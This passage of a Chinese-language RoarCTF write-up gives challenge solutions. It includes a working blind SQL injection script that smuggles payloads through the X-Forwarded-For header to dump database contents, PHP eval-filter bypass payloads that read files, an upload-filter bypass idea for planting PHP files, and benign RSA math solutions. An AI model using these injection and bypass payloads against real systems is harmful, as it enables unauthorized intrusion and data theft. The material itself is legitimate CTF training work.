+<p><img alt="image-20211114142040727" loading="lazy" src="/posts/ctf-roarctfwp/image-20211114142040727.png"></p>
+<p>成功执行了.</p>
+<p>搬运赵师傅的脚本学习学习</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://localhost:8302/&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">execute_sql</span>(sql):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[*]请求语句：&#34;</span> <span style="color:#f92672">+</span> sql)
+</span></span><span style="display:flex;"><span>    return_result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0&#39;|length((&#34;</span> <span style="color:#f92672">+</span> sql <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;))|&#39;0&#34;</span>
+</span></span><span style="display:flex;"><span>    session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(target, headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;X-Forwarded-For&#39;</span>: payload})
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(target, headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;X-Forwarded-For&#39;</span>: <span style="color:#e6db74">&#39;glzjin&#39;</span>})
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(target, headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;X-Forwarded-For&#39;</span>: <span style="color:#e6db74">&#39;glzjin&#39;</span>})
+</span></span><span style="display:flex;"><span>    start_pos <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;Last Ip: &#34;</span>)
+</span></span><span style="display:flex;"><span>    end_pos <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34; --&gt;&#34;</span>, start_pos)
+</span></span><span style="display:flex;"><span>    length <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>text[start_pos <span style="color:#f92672">+</span> <span style="color:#ae81ff">9</span>: end_pos])
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[+]长度：&#34;</span> <span style="color:#f92672">+</span> str(length))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, length <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">5</span>):
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0&#39;|conv(hex(substr((&#34;</span> <span style="color:#f92672">+</span> sql <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;),&#34;</span> <span style="color:#f92672">+</span> str(i) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;,5)),16,10)|&#39;0&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(target, headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;X-Forwarded-For&#39;</span>: payload})
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(target, headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;X-Forwarded-For&#39;</span>: <span style="color:#e6db74">&#39;glzjin&#39;</span>})
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(target, headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;X-Forwarded-For&#39;</span>: <span style="color:#e6db74">&#39;glzjin&#39;</span>})
+</span></span><span style="display:flex;"><span>        start_pos <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;Last Ip: &#34;</span>)
+</span></span><span style="display:flex;"><span>        end_pos <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34; --&gt;&#34;</span>, start_pos)
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>text[start_pos <span style="color:#f92672">+</span> <span style="color:#ae81ff">9</span>: end_pos])
+</span></span><span style="display:flex;"><span>        return_result <span style="color:#f92672">+=</span> bytes<span style="color:#f92672">.</span>fromhex(hex(result)[<span style="color:#ae81ff">2</span>:])<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[+]位置 &#34;</span> <span style="color:#f92672">+</span> str(i) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; 请求五位成功:&#34;</span> <span style="color:#f92672">+</span> bytes<span style="color:#f92672">.</span>fromhex(hex(result)[<span style="color:#ae81ff">2</span>:])<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> return_result
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 获取数据库</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+]获取成功：&#34;</span> <span style="color:#f92672">+</span> execute_sql(<span style="color:#e6db74">&#34;SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 获取数据库表</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+]获取成功：&#34;</span> <span style="color:#f92672">+</span> execute_sql(<span style="color:#e6db74">&#34;SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = &#39;F4l9_D4t4B45e&#39;&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 获取数据库表</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+]获取成功：&#34;</span> <span style="color:#f92672">+</span> execute_sql(<span style="color:#e6db74">&#34;SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = &#39;F4l9_D4t4B45e&#39; AND TABLE_NAME = &#39;F4l9_t4b1e&#39; &#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 获取表中内容</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+]获取成功：&#34;</span> <span style="color:#f92672">+</span> execute_sql(<span style="color:#e6db74">&#34;SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e&#34;</span>))
+</span></span></code></pre></div><p>5555555</p>
+<p>在addslashes后插入数据在数据库中是这样的</p>
+<p><img alt="image-20211114142048129" loading="lazy" src="/posts/ctf-roarctfwp/image-20211114142048129.png"></p>
+<p>第二行是提取出来不经过addslashes重新插入的结果</p>
+<h2 id="easy_calc">easy_calc<a hidden class="anchor" aria-hidden="true" href="#easy_calc">#</a></h2>
+<p><a href="https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>
+<pre tabindex="0"><code>hexdec(bin2hex(&#39;/&#39;));
+?+num=scandir(hex2bin(dechex(47))) #解码出来的会自动带上引号
+hexdec(bin2hex(&#39;/f1agg&#39;));
+?+num=file_get_contents(hex2bin(dechex(52115961636711)))
+</code></pre><p>源码是这么执行语句的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> $str <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;num&#39;</span>];
+</span></span><span style="display:flex;"><span>        $blacklist <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;\t&#39;</span>, <span style="color:#e6db74">&#39;\r&#39;</span>, <span style="color:#e6db74">&#39;\n&#39;</span>,<span style="color:#e6db74">&#39;\&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#e6db74">&#39;`&#39;</span>, <span style="color:#e6db74">&#39;\[&#39;</span>, <span style="color:#e6db74">&#39;\]&#39;</span>,<span style="color:#e6db74">&#39;\$&#39;</span>,<span style="color:#e6db74">&#39;\\&#39;</span>,<span style="color:#e6db74">&#39;\^&#39;</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">foreach</span> ($blacklist <span style="color:#66d9ef">as</span> $blackitem) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $blackitem <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/m&#39;</span>, $str)) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;what are you want to do?&#34;</span>);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">eval</span>(<span style="color:#e6db74">&#39;echo &#39;</span><span style="color:#f92672">.</span>$str<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;;&#39;</span>);
+</span></span></code></pre></div><h2 id="simple-upload">Simple UPload<a hidden class="anchor" aria-hidden="true" href="#simple-upload">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">Home\Controller</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> <span style="color:#a6e22e">Think\Controller</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">IndexController</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">Controller</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">index</span>()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">upload</span>()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $uploadFile <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;file&#39;</span>] ;
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strstr</span>(<span style="color:#a6e22e">strtolower</span>($uploadFile[<span style="color:#e6db74">&#39;name&#39;</span>]), <span style="color:#e6db74">&#34;.php&#34;</span>) ) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        $upload <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\Think\Upload</span>();<span style="color:#75715e">// 实例化上传类
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $upload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">maxSize</span>  <span style="color:#f92672">=</span> <span style="color:#ae81ff">4096</span> ;<span style="color:#75715e">// 设置附件上传大小
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $upload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">allowExts</span>  <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;jpg&#39;</span>, <span style="color:#e6db74">&#39;gif&#39;</span>, <span style="color:#e6db74">&#39;png&#39;</span>, <span style="color:#e6db74">&#39;jpeg&#39;</span>);<span style="color:#75715e">// 设置附件上传类型
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $upload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">rootPath</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./Public/Uploads/&#39;</span>;<span style="color:#75715e">// 设置附件上传目录
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $upload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">savePath</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;<span style="color:#75715e">// 设置附件上传子目录
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $info <span style="color:#f92672">=</span> $upload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">upload</span>() ;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$info) {<span style="color:#75715e">// 上传错误提示错误信息
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>($upload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getError</span>());
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>        }<span style="color:#66d9ef">else</span>{<span style="color:#75715e">// 上传成功 获取上传文件信息
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          $url <span style="color:#f92672">=</span> <span style="color:#a6e22e">__ROOT__</span><span style="color:#f92672">.</span><span style="color:#a6e22e">substr</span>($upload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">rootPath</span>,<span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>$info[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;savepath&#39;</span>]<span style="color:#f92672">.</span>$info[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;savename&#39;</span>] ;
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">json_encode</span>(<span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;url&#34;</span><span style="color:#f92672">=&gt;</span>$url,<span style="color:#e6db74">&#34;success&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#ae81ff">1</span>));
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>} 
+</span></span></code></pre></div><p>思路: 由于只对&rsquo;file&rsquo;文件做判断, 所以一旦上传多个文件就可以绕过,然后根据文件名的生成方式来爆破php文件位置.</p>
+<h1 id="crypto">crypto<a hidden class="anchor" aria-hidden="true" href="#crypto">#</a></h1>
+<h2 id="rsa">RSA<a hidden class="anchor" aria-hidden="true" href="#rsa">#</a></h2>
+<p>题目给出了条件</p>
+<pre tabindex="0"><code>n=117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127L
+
+e=0x10001
+
+(((y%x)**5)%(x%y))**2019+y**316+(y+1)/x=2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724L
+
+p=gmpy2.next_prime(x*y*z)
+
+q=gmpy2.next_prime(z)
+
+c=104691362123417589582551926531991781182010115901906985242039858907478735399784169051363443219315680244232603533899657231603732323266992359436518422851277069852793135320396586515487921637920627272606974731853791181271097899570276732277312961775278934241404863519840373617638621536398209255347566027214411203044623463749518663685607627212717097166124505123129373333338412199099199928067759937853247401620571810107903873489834435586333677991755979431408011776165868218508677566291652682933956103976791630704584853343422052444254468560250747030329091301992578584871488469381826293759687914010014083275135171832587631422L
+</code></pre><p>因为</p>
+<pre tabindex="0"><code>2**(2019) &gt; 26833491826787145242474...1422L
+</code></pre><p>所以</p>
+<pre tabindex="0"><code>((y%x)**5)%(x%y) = 1 或者 0
+</code></pre><p>所以将这项忽略,再将(y+1)/x忽略</p>
+<pre tabindex="0"><code>y 约等于26833491826787145242474...1422L的316次方
+</code></pre><pre tabindex="0"><code>y 约等于83
+</code></pre><p>然后(y+1)/x 必须为整数 ,结合上述条件可以轻易求得x=2.y=83</p>
+<p>接下来</p>
+<pre tabindex="0"><code>p = xyz + a
+q = z + b
+xyzz + xyzb + az + ab = n
+</code></pre><p>忽略ab, az, xyzb, 求出z的近似值,然后这个值肯定比真实的z要大, 因此可以根据这个值循环减一带入运算来爆破p ,求出的p如果可以整除n就停下.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> gmpy2
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util <span style="color:#f92672">import</span> number
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>n<span style="color:#f92672">=</span><span style="color:#ae81ff">117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127</span>L
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>e<span style="color:#f92672">=</span><span style="color:#ae81ff">0x10001</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c<span style="color:#f92672">=</span><span style="color:#ae81ff">104691362123417589582551926531991781182010115901906985242039858907478735399784169051363443219315680244232603533899657231603732323266992359436518422851277069852793135320396586515487921637920627272606974731853791181271097899570276732277312961775278934241404863519840373617638621536398209255347566027214411203044623463749518663685607627212717097166124505123129373333338412199099199928067759937853247401620571810107903873489834435586333677991755979431408011776165868218508677566291652682933956103976791630704584853343422052444254468560250747030329091301992578584871488469381826293759687914010014083275135171832587631422</span>L
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#  x=2</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#  y = 83</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#  z_close = gmpy2.iroot(n//166, 2)</span>
+</span></span><span style="display:flex;"><span>z_close <span style="color:#f92672">=</span> <span style="color:#ae81ff">842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458023</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>    p_close <span style="color:#f92672">=</span> gmpy2<span style="color:#f92672">.</span>next_prime(<span style="color:#ae81ff">166</span><span style="color:#f92672">*</span>z_close)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> n <span style="color:#f92672">%</span> p_close <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> p_close
+</span></span><span style="display:flex;"><span>        q <span style="color:#f92672">=</span> n <span style="color:#f92672">//</span> p
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    z_close <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#  p = 139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183 </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#  q = 842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>phi <span style="color:#f92672">=</span> (p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> gmpy2<span style="color:#f92672">.</span>invert(e, phi)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print number<span style="color:#f92672">.</span>long_to_bytes(pow(c,d,n))
+</span></span></code></pre></div><h2 id="babyrsa">babyrsa<a hidden class="anchor" aria-hidden="true" href="#babyrsa">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sympy
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">myGetPrime</span>():
+</span></span><span style="display:flex;"><span>    A<span style="color:#f92672">=</span> getPrime(<span style="color:#ae81ff">513</span>)
+</span></span><span style="display:flex;"><span>    print(A)
+</span></span><span style="display:flex;"><span>    B<span style="color:#f92672">=</span>A<span style="color:#f92672">-</span>random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1e3</span>,<span style="color:#ae81ff">1e5</span>)
+</span></span><span style="display:flex;"><span>    print(B)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> sympy<span style="color:#f92672">.</span>nextPrime((B<span style="color:#960050;background-color:#1e0010">!</span>)<span style="color:#f92672">%</span>A)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>myGetPrime()
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>q<span style="color:#f92672">=</span>myGetPrime()
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">=</span>myGetPrime()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>n<span style="color:#f92672">=</span>p<span style="color:#f92672">*</span>q<span style="color:#f92672">*</span>r
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span>
+</span></span><span style="display:flex;"><span>c<span style="color:#f92672">=</span>pow(flag,e,n)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#e=0x1001</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#c=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#so,what is the flag?</span>
+</span></span></code></pre></div><p>直接求b的阶乘是不可能的,递归达到最大限制次数也求不出来.</p>
+<p>这里要用到威尔逊定理</p>
+<blockquote>
+<p>判定一个数字是素数的充分必要条件:</p>
+<p>(p-1)! = -1 (mod p)</p></blockquote>
+<p>在这套题中可以发现<code>(-1)(A-1)(A-2)...(B+2)(B+1)</code>是<code>B!</code> 关于A的逆元,然后就好求了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> gmpy2
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sympy
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util <span style="color:#f92672">import</span> number
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">myprime</span>(a, b):
+</span></span><span style="display:flex;"><span>    ans <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(b<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>, a):
+</span></span><span style="display:flex;"><span>        ans <span style="color:#f92672">=</span> (ans <span style="color:#f92672">*</span>i) <span style="color:#f92672">%</span> a
+</span></span><span style="display:flex;"><span>    ans <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">*</span> ans
+</span></span><span style="display:flex;"><span>    num <span style="color:#f92672">=</span> gmpy2<span style="color:#f92672">.</span>invert(ans ,a)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> sympy<span style="color:#f92672">.</span>nextprime(num)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>A1<span style="color:#f92672">=</span><span style="color:#ae81ff">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span>
+</span></span><span style="display:flex;"><span>B1<span style="color:#f92672">=</span><span style="color:#ae81ff">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> myprime(A1, B1)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>A2<span style="color:#f92672">=</span><span style="color:#ae81ff">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span>
+</span></span><span style="display:flex;"><span>B2<span style="color:#f92672">=</span><span style="color:#ae81ff">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>q <span style="color:#f92672">=</span> myprime(A2, B2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
